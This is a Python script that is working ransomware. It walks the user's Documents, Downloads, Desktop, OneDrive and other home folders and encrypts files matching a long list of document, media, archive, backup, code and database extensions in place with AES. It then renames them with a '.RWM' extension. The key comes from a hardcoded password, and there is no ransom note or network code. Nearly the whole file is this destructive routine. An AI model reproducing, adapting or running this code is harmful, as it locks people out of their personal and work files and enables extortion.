import os
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad



password_key = "password123"

extension = ".RWM"

TargetFiles = [
    # Documents & Office
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.rtf', '.txt', '.odt', '.ods', '.odp', '.tex', '.log', '.csv', '.accd', '.accdb',

    # Images
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai', '.svg', '.raw', '.cr2', '.nef',

    # Audio
    '.mp3', '.wav', '.flac', '.midi', '.ogg',

    # Video
    '.avi', '.mov', '.mp4', '.mpeg', '.mpeg2', '.mpeg3', '.mpg', '.mkv', '.flv', '.3gp', '.m4v', '.wmv',

    # Archives & Backups
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bak', '.backup', '.wbcat',

    # Code & Developer Files
    '.py', '.html', '.htm', '.php', '.js', '.css', '.cpp', '.c', '.java', '.cs', '.vb', '.asp', '.aspx', '.cgi', '.pl',

    # Databases
    '.sql', '.db', '.dbf', '.mdb', '.accdb', '.accd'
]

Folders = [
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
]


def encrypt_file(password, file_path):
    salt = get_random_bytes(16)
    iv = get_random_bytes(16)
    
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    encrypted_data = salt + iv + ciphertext
    
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    
    os.rename(file_path, file_path + extension)
    return file_path + extension



def check_file_extension(filename):
    for ext in TargetFiles:
        if filename.lower().endswith(ext.lower()):
            return True
    return False



def startEncrypting():
    user_folder = os.path.expanduser("~")
    # print(f"user_folder: {user_folder}")

    for folders in Folders:
        full_folders_path = os.path.join(user_folder, folders)
           
        # print(f"full_folders_path: {full_folders_path}")

        for root, dirs, files in os.walk(full_folders_path):
            for file in files:
                full_path = os.path.join(root, file)
                # print(f"full_path: {full_path}")

                # if not full_path.endswith(LocalFileName):
                        # print(full_path)

                if check_file_extension(full_path):
                    # print(full_path)
                    output_path = encrypt_file(password_key.encode(), full_path)
                    print(f"SUCCESS: File Encrypted: {output_path}")


if __name__ == "__main__":
    print("---------------------------")
    startEncrypting()
    print("---------------------------")
